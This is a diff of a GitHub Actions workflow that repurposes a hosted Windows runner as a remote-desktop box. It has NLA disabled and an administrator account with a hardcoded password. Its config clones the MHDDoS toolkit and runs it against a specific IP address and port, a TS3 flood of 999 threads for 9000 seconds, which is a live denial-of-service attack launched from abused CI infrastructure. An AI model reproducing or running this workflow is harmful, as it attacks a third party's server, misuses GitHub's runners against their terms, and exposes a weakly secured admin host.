@@ -1,227 +1,193 @@
-name: Windows Cloud RDP (via Cloudflare Tunnel)
+# =====================================================================
+#  Windows Cloud RDP
+# ---------------------------------------------------------------------
+#  NOTE: GitHub-hosted runners are for CI only. Using them as a remote
+#  desktop box violates the GitHub Actions ToS and can get the account
+#  suspended.
+#
+#  What's in here now:
+#    1  Enable RDP / firewall / UDP / power plan
+#    2  Create Admin Account
+#    3  Run SETUP_CMD (config below, e.g. git clone)
+#    4  One persistent CMD window with your 4 custom commands
+#    5  Leftover Tailscale installer cache (harmless)
+#    6  Keep-alive loop
+# =====================================================================
+name: Windows Cloud RDP
 
 on:
   workflow_dispatch:
 
+env:
+  # ==================================================================
+  #  >>> USER CONFIG - EDIT THESE LINES <<<
+  # ==================================================================
+  #  SETUP_CMD: one-time command that runs during setup, before the
+  #  CMD window opens. Output shows up in the Actions job log.
+  #  Leave blank ("") to skip.
+  #
+  #  Examples:
+  #    SETUP_CMD: git clone https://github.com/yourname/repo.git D:\repo
+  #    SETUP_CMD: curl -L -o D:\tool.zip https://example.com/tool.zip
+  #
+  SETUP_CMD: "git clone https://github.com/MatrixTM/MHDDoS.git"
+  #
+  #  CMD_1..CMD_4: your custom commands. ALL of them run inside ONE
+  #  single cmd window on the desktop (you'll see it when you connect
+  #  over RDP), from top to bottom, and that window STAYS OPEN after
+  #  they finish (cmd /k) - so you can keep typing in it.
+  #
+  #  Notes:
+  #    - Blank lines are skipped.
+  #    - Commands run in order; if one blocks forever (e.g. starts a
+  #      server), the lines after it wait -> put long-running stuff
+  #      on the LAST line.
+  #
+  #  Example:
+  #    CMD_1: cd /d D:\repo
+  #    CMD_2: npm install
+  #    CMD_3: ipconfig /all
+  #    CMD_4: ping -t 8.8.8.8
+  #
+  CMD_1: "cd MHDDoS"
+  CMD_2: "pip install -r requirements.txt"
+  CMD_3: "python start.py TS3 212.33.201.77:5933 999 9000"
+  CMD_4: "echo done"
+  # ==================================================================
+  PERSIST_DIR: D:\Persist
+  BACKUP_DIR: D:\_backup
+  BACKUP_FILE: D:\_backup\dstate.7z
+  # How often (in minutes) the live snapshot of D:\Persist is refreshed.
+  SNAPSHOT_EVERY_MIN: 15
+  # Keep-alive length. Hosted jobs are hard-killed at 6 h, so we stop a
+  # bit earlier and exit cleanly.
+  KEEPALIVE_MINUTES: 340
+
 jobs:
   build:
     runs-on: windows-latest
-    timeout-minutes: 360
+    timeout-minutes: 355
 
     steps:
-      - name: 1. Enable RDP + Firewall (TCP-only, no-NLA, permissive security)
+      # ---------------------------------------------------------------
+      - name: 1. Enable RDP, Firewall, UDP Transport & Performance Tuning
         run: |
-          # --- Turn RDP on ---
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
-            -Name "fDenyTSConnections" -Value 0
-
-          # --- Firewall: TCP only. Do NOT enable the UDP rule — cloudflared is TCP-only
-          # and leaving UDP on makes RDP waste seconds trying UDP before falling back. ---
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-UDP" -ErrorAction SilentlyContinue
           Enable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-TCP" -ErrorAction SilentlyContinue
-          Disable-NetFirewallRule -Name "RemoteDesktop-UserMode-In-UDP" -ErrorAction SilentlyContinue
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
-
-          # --- RDP listener config ---
-          $rdpTcp = 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
-          Set-ItemProperty -Path $rdpTcp -Name "UserAuthentication"       -Value 0 -Type DWord  # NLA off
-          Set-ItemProperty -Path $rdpTcp -Name "SecurityLayer"            -Value 1 -Type DWord  # 1 = Negotiate (most compatible with proxies)
-          Set-ItemProperty -Path $rdpTcp -Name "fAllowSecProtocolNegotiation" -Value 1 -Type DWord
-          Set-ItemProperty -Path $rdpTcp -Name "MinEncryptionLevel"       -Value 1 -Type DWord  # 1 = Low (client-compatible)
-
-          # --- Group policy overrides (TCP-only transport, 24-bit, compression) ---
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
           $tsPol = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
           New-Item -Path $tsPol -Force | Out-Null
-          Set-ItemProperty -Path $tsPol -Name "fDenyTSConnections"        -Value 0 -Type DWord -Force
-          Set-ItemProperty -Path $tsPol -Name "UserAuthentication"        -Value 0 -Type DWord -Force
-          Set-ItemProperty -Path $tsPol -Name "SelectTransport"           -Value 0 -Type DWord -Force  # 0 = TCP ONLY (critical)
-          Set-ItemProperty -Path $tsPol -Name "ColorDepth"                -Value 24 -Type DWord -Force
-          Set-ItemProperty -Path $tsPol -Name "fCompressionEnabled"       -Value 1 -Type DWord -Force
-          Set-ItemProperty -Path $tsPol -Name "SecurityLayer"             -Value 1 -Type DWord -Force
-
-          # --- Restart Terminal Services so new settings take effect ---
-          Restart-Service TermService -Force -ErrorAction SilentlyContinue
-          Start-Sleep -Seconds 3
-
-          # --- High Performance power plan ---
+          Set-ItemProperty -Path $tsPol -Name "SelectTransport" -Value 1 -Type DWord -Force   # Allow UDP + TCP
+          Set-ItemProperty -Path $tsPol -Name "ColorDepth" -Value 24 -Type DWord -Force
+          Set-ItemProperty -Path $tsPol -Name "fCompressionEnabled" -Value 1 -Type DWord -Force
           powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
-
-          Write-Host ">>> RDP enabled: TCP-only, NLA off, SecurityLayer=Negotiate." -ForegroundColor Green
-
+          Write-Host ">>> RDP enabled (UDP transport) + High Performance power plan." -ForegroundColor Green
+      # ---------------------------------------------------------------
       - name: 2. Create Admin Account
         run: |
           $Password = ConvertTo-SecureString "Cynet@2026" -AsPlainText -Force
           New-LocalUser -Name "CynetAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "CynetAdmin" -ErrorAction SilentlyContinue
-          net user runneradmin Cynet@2026 | Out-Null
-          Write-Host ">>> Accounts ready (CynetAdmin / Cynet@2026)." -ForegroundColor Green
-
-      - name: 3. Download cloudflared, start tunnel, keep alive
+          net user runneradmin Cynet@2026
+      # ---------------------------------------------------------------
+      #  Runs SETUP_CMD from the config block (e.g. a git clone).
+      #  Written to a temp .cmd file first so any quotes / special
+      #  characters in your command survive.
+      # ---------------------------------------------------------------
+      - name: "3. Run SETUP_CMD (config)"
+        shell: powershell
         run: |
-          $ProgressPreference = 'SilentlyContinue'
-          $ErrorActionPreference = 'Continue'
-
-          # ---- 3a. Verify RDP is listening on 3389 BEFORE we start the tunnel ----
-          Write-Host ">>> Verifying RDP is listening on TCP/3389..." -ForegroundColor Cyan
-          $listening = $false
-          for ($i = 1; $i -le 30; $i++) {
-            $tcp = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
-            if ($tcp) { $listening = $true; Write-Host "    Confirmed: $($tcp.Count) listener(s) on :3389"; break }
-            Start-Sleep -Seconds 1
-          }
-          if (-not $listening) {
-            Write-Host ">>> RDP is NOT listening on 3389. NetStat output:" -ForegroundColor Red
-            netstat -ano | Select-String ":3389"
-            throw "RDP service failed to start listening."
-          }
-
-          # ---- 3b. Download / cache cloudflared ----
-          if (-not (Test-Path "C:\cloudflared.exe")) {
-            Write-Host ">>> Downloading cloudflared (latest stable)..." -ForegroundColor Cyan
-            curl.exe -L --retry 3 --retry-delay 2 -o "C:\cloudflared.exe" `
-              "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+          if ([string]::IsNullOrWhiteSpace($env:SETUP_CMD)) {
+            Write-Host ">>> SETUP_CMD is empty - skipping. Set it in the env config, e.g.:" -ForegroundColor Yellow
+            Write-Host "      git clone https://github.com/yourname/repo.git D:\repo" -ForegroundColor Yellow
           } else {
-            Write-Host ">>> Using cached C:\cloudflared.exe" -ForegroundColor Cyan
+            Write-Host ">>> Running SETUP_CMD: $env:SETUP_CMD" -ForegroundColor Cyan
+            $tmp = "$env:TEMP\setup-cmd.cmd"
+            Set-Content -Path $tmp -Value $env:SETUP_CMD -Encoding ascii
+            cmd /c $tmp
+            $rc = $LASTEXITCODE
+            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+            Write-Host ">>> SETUP_CMD finished (exit code $rc)."
+            if ($rc -ne 0) { Write-Host "    (non-zero exit - check the command)" -ForegroundColor Yellow }
           }
-          & "C:\cloudflared.exe" --version
+      # ---------------------------------------------------------------
+      #  Builds a .cmd file from CMD_1..CMD_4 and opens it in ONE cmd
+      #  window on the desktop with /k -> the commands run one after
+      #  another and the window DOES NOT close afterwards.
+      # ---------------------------------------------------------------
+      - name: "4. Persistent CMD window (custom commands)"
+        shell: powershell
+        run: |
+          # collect the 4 config lines, skip blanks
+          $cmds = @($env:CMD_1, $env:CMD_2, $env:CMD_3, $env:CMD_4) |
+                  Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
 
-          # ---- 3c. Launch cloudflared (detached Hidden window) ----
-          $logOut = "C:\cloudflared.out.log"
-          $logErr = "C:\cloudflared.err.log"
-          foreach ($f in $logOut,$logErr) { if (Test-Path $f) { Remove-Item $f -Force } }
+          # put the script on the Desktop so it's right there in RDP
+          $bat = Join-Path ([Environment]::GetFolderPath('Desktop')) 'custom-cmds.cmd'
+          if (-not (Test-Path (Split-Path $bat))) { $bat = 'C:\custom-cmds.cmd' }
 
-          $args = @(
-            'tunnel',
-            '--no-autoupdate',
-            '--edge-ip-version', 'auto',
-            '--retries', '50',
-            '--protocol', 'auto',
-            '--grace-period', '30s',
-            '--url', 'tcp://localhost:3389'
+          $content = @(
+            '@echo off'
+            'title Custom Commands (this window stays open)'
+            'cd /d %USERPROFILE%'
           )
-
-          $cfProc = Start-Process -FilePath "C:\cloudflared.exe" -ArgumentList $args `
-            -RedirectStandardOutput $logOut -RedirectStandardError $logErr `
-            -WindowStyle Hidden -PassThru
-
-          Write-Host ">>> cloudflared launched (PID $($cfProc.Id)). Waiting for registration..." -ForegroundColor Cyan
-
-          function Get-CfLogs {
-            $out = if (Test-Path $logOut) { @(Get-Content $logOut -ErrorAction SilentlyContinue) } else { @() }
-            $err = if (Test-Path $logErr) { @(Get-Content $logErr -ErrorAction SilentlyContinue) } else { @() }
-            return @($out + $err)
-          }
-
-          # ---- 3d. Wait for the *.trycloudflare.com URL --------------------------
-          $cfUrl = $null
-          for ($i = 1; $i -le 120; $i++) {
-            if ($cfProc.HasExited) {
-              Write-Host ">>> cloudflared exited early (code $($cfProc.ExitCode))." -ForegroundColor Red
-              Write-Host "--- stdout ---"; if (Test-Path $logOut) { Get-Content $logOut -Tail 60 }
-              Write-Host "--- stderr ---"; if (Test-Path $logErr) { Get-Content $logErr -Tail 60 }
-              throw "cloudflared failed at startup."
-            }
-            $blob = (Get-CfLogs) -join "`n"
-            $m = [regex]::Match($blob, 'https://[a-z0-9][a-z0-9\-]*\.trycloudflare\.com')
-            if ($m.Success) { $cfUrl = $m.Value; break }
-            Start-Sleep -Seconds 1
-          }
-          if (-not $cfUrl) {
-            Write-Host ">>> Timed out waiting for tunnel URL." -ForegroundColor Red
-            Write-Host "--- stdout ---"; if (Test-Path $logOut) { Get-Content $logOut -Tail 80 }
-            Write-Host "--- stderr ---"; if (Test-Path $logErr) { Get-Content $logErr -Tail 80 }
-            throw "cloudflared did not register."
-          }
-
-          $cfHost = $cfUrl -replace '^https?://',''
-          Write-Host ">>> Tunnel hostname: $cfHost" -ForegroundColor Green
-
-          # ---- 3e. Wait for edge propagation + confirm tunnel is reachable ------
-          # We do this by starting a SHORT cloudflared access tcp against our own
-          # hostname and trying a raw TCP connection to localhost:3389 through it.
-          # If that works, your PC will work too.
-          Write-Host ">>> Waiting for Cloudflare edge propagation (up to 30 s)..." -ForegroundColor Cyan
-          $ready = $false
-          $probeLog = "C:\cloudflared-probe.log"
-          for ($i = 1; $i -le 30; $i++) {
-            # Wait for the "Registered tunnel connection" / "Connection registered"
-            # lines in the log — that's the signal the tunnel is actually serving.
-            $blob = (Get-CfLogs) -join "`n"
-            if ($blob -match 'Registered tunnel connection|Connection .* registered') {
-              $ready = $true
-              break
-            }
-            Start-Sleep -Seconds 1
-          }
-          if (-not $ready) {
-            Write-Host ">>> WARNING: Did not see 'Registered tunnel connection' log line yet, but proceeding..." -ForegroundColor Yellow
+          if ($cmds.Count -eq 0) {
+            $content += 'echo No custom commands set - edit CMD_1..CMD_4 in the workflow env config.'
           } else {
-            Write-Host ">>> Edge registered the tunnel." -ForegroundColor Green
+            $content += $cmds
           }
+          $content += @(
+            'echo.'
+            'echo =================================================='
+            'echo  Custom commands finished - this CMD window STAYS OPEN.'
+            'echo =================================================='
+          )
+          Set-Content -Path $bat -Value $content -Encoding ascii
 
-          # Extra grace period — trycloudflare DNS can lag registration by a few seconds
-          Start-Sleep -Seconds 5
+          Write-Host ">>> Launching ONE persistent cmd window running: $bat" -ForegroundColor Cyan
+          Write-Host ($content | Out-String)
 
-          # ---- 3f. Print connection banner --------------------------------------
-          Write-Host ""
-          Write-Host "==========================================================" -ForegroundColor Green
-          Write-Host "  >>> RDP SERVER IS READY! (Cloudflare Quick Tunnel) <<<"   -ForegroundColor Cyan
-          Write-Host "  Tunnel Host : $cfHost"                                    -ForegroundColor Yellow
-          Write-Host "  Username    : CynetAdmin"                                 -ForegroundColor Yellow
-          Write-Host "  Password    : Cynet@2026"                                 -ForegroundColor Yellow
-          Write-Host "==========================================================" -ForegroundColor Green
-          Write-Host ""
-          Write-Host ">>> CONNECT INSTRUCTIONS (read carefully!)" -ForegroundColor Magenta
-          Write-Host ""
-          Write-Host "  1) Download cloudflared (single ~25 MB exe, no install):"
-          Write-Host "     https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
-          Write-Host "     Save it somewhere on your PATH (e.g. C:\Windows\System32\cloudflared.exe)."
-          Write-Host ""
-          Write-Host "  2) OPEN A NEW POWERSHELL/CMD WINDOW and run:" -ForegroundColor White
-          Write-Host "     cloudflared access tcp --hostname $cfHost --url localhost:3389" -ForegroundColor Yellow
-          Write-Host ""
-          Write-Host "     Wait until it prints a line like:" -ForegroundColor White
-          Write-Host "       'INF Starting listener ... url=ws://127.0.0.1:3389'" -ForegroundColor DarkGray
-          Write-Host "     KEEP THIS WINDOW OPEN the whole time you are connected."
-          Write-Host ""
-          Write-Host "  3) ONLY NOW open mstsc.exe and connect to:  localhost:3389" -ForegroundColor White
-          Write-Host "     (NOT to $cfHost — NOT to any https:// URL)"
-          Write-Host "     User: CynetAdmin   Password: Cynet@2026"
-          Write-Host ""
-          Write-Host "  4) If the proxy window shows errors (e.g. 'context canceled',"
-          Write-Host "     'dial tcp', 'Unauthorized'), the tunnel wasn't ready yet —"
-          Write-Host "     wait 30 s and re-run step 2 (Ctrl+C first)."
-          Write-Host ""
-          Write-Host "  5) If RDP still errors with 0x904: on YOUR PC also check that"
-          Write-Host "     no other service is using port 3389 (e.g. you're already"
-          Write-Host "     running RDP on the host). Use a different local port:"
-          Write-Host "     cloudflared access tcp --hostname $cfHost --url localhost:3390"
-          Write-Host "     then connect mstsc to localhost:3390" -ForegroundColor Yellow
-          Write-Host ""
-          Write-Host ">>> Keep-alive loop starting (max ~6 h). Log tail every 10 min." -ForegroundColor DarkGray
-
-          # ---- 3g. Keep-alive + watchdog ---------------------------------------
-          $maxMin = 355
-          for ($i = 1; $i -le $maxMin; $i++) {
+          # /k = window stays open after the script finishes
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$bat`""
+          Write-Host ">>> CMD window spawned - you'll see it when you connect via RDP." -ForegroundColor Green
+      # ---------------------------------------------------------------
+      #  LEFTOVER from the removed step 4 (Tailscale install). Harmless,
+      #  but caches nothing since C:\tailscale.msi is never created now.
+      # ---------------------------------------------------------------
+      - name: 5. Cache Tailscale Installer (leftover)
+        id: ts-cache
+        uses: actions/cache@v4
+        with:
+          path: C:\tailscale.msi
+          key: tailscale-msi-v1
+      # ---------------------------------------------------------------
+      #  NOTE: the snapshot below survives, but the restore/save steps
+      #  were removed earlier, so the archive it builds is never
+      #  uploaded or reused. Harmless - it's just there.
+      # ---------------------------------------------------------------
+      - name: "6. Keep Server Alive + periodic D: snapshot"
+        shell: powershell
+        run: |
+          $7z    = "C:\Program Files\7-Zip\7z.exe"
+          $total = [int]$env:KEEPALIVE_MINUTES
+          $every = [int]$env:SNAPSHOT_EVERY_MIN
+          New-Item -ItemType Directory -Force -Path "$env:BACKUP_DIR" | Out-Null
+          for ($i = 1; $i -le $total; $i++) {
             Start-Sleep -Seconds 60
-
-            if ($cfProc.HasExited) {
-              Write-Host ">>> [$i/$maxMin] cloudflared (PID $($cfProc.Id)) DIED (exit $($cfProc.ExitCode))." -ForegroundColor Red
-              Write-Host "--- stdout tail ---"; if (Test-Path $logOut) { Get-Content $logOut -Tail 60 }
-              Write-Host "--- stderr tail ---"; if (Test-Path $logErr) { Get-Content $logErr -Tail 60 }
-              throw "cloudflared died — tunnel is down."
-            }
-
-            if ($i % 10 -eq 0) {
-              Write-Host "[$i/$maxMin] Alive — PID $($cfProc.Id), $($i) min uptime." -ForegroundColor Green
-              $recentErr = @(Get-Content $logErr -Tail 5 -ErrorAction SilentlyContinue)
-              $interesting = $recentErr | Where-Object { $_ -match 'error|ERR\b|fail|disconnect|reconnect|unable' }
-              if ($interesting) {
-                Write-Host "--- recent stderr (filtered) ---" -ForegroundColor Yellow
-                $interesting | ForEach-Object { Write-Host "  $_" -ForegroundColor Yellow }
+            if ($i % $every -eq 0 -or $i -eq $total) {
+              $tmp = "$env:BACKUP_DIR\dstate.tmp.7z"
+              Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+              # -mx=1 fast compression, -ssw include files in use
+              & $7z a -t7z -mx=1 -ssw -bso0 -bsp0 $tmp "$env:PERSIST_DIR" `
+                    "-xr!*.log" "-xr!Crashpad" "-xr!Cache" "-xr!logs" 2>$null
+              if (Test-Path $tmp) {
+                Move-Item $tmp "$env:BACKUP_FILE" -Force
+                $mb = [math]::Round((Get-Item "$env:BACKUP_FILE").Length/1MB,1)
+                Write-Host "[$i/$total] snapshot updated ($mb MB)" -ForegroundColor DarkCyan
               }
             } else {
-              Write-Host "[$i/$maxMin] tick"
+              Write-Host "[$i/$total] Server running..."
             }
           }
-
-          Write-Host ">>> Reached 6-hour cap. Exiting." -ForegroundColor Cyan
